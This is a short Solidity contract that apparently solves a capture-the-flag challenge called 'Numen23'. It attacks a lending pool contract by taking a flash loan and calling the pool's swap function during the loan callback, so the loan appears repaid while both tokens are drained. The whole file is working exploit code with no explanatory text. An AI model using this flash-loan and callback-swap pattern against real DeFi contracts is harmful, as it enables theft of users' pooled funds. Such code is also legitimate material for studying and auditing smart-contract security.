// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;
import "./LenderPool.sol";

contract LenderPoolNumen23Attack {
    ERC20Numen23 public token0;
    ERC20Numen23 public token1;
    LenderPoolNumen23 public lp;
    function attack(address target) public {
        lp = LenderPoolNumen23(target);
        token0 = ERC20Numen23(address(lp.token0()));
        token1 = ERC20Numen23(address(lp.token1()));

        token0.approve(address(target), token0.balanceOf(address(lp)));
        token1.approve(address(target), token1.balanceOf(address(lp)));
        lp.flashLoan(token0.balanceOf(target), address(this));   // get token1
        lp.swap(address(token0), token0.balanceOf(address(lp)));  // token1 -> token0
    }

    function receiveEther(uint256 /*amount*/) public {
        lp.swap(address(token1), token1.balanceOf(address(lp)));  // token0 -> tokon1, repay meanwhile
    }

}
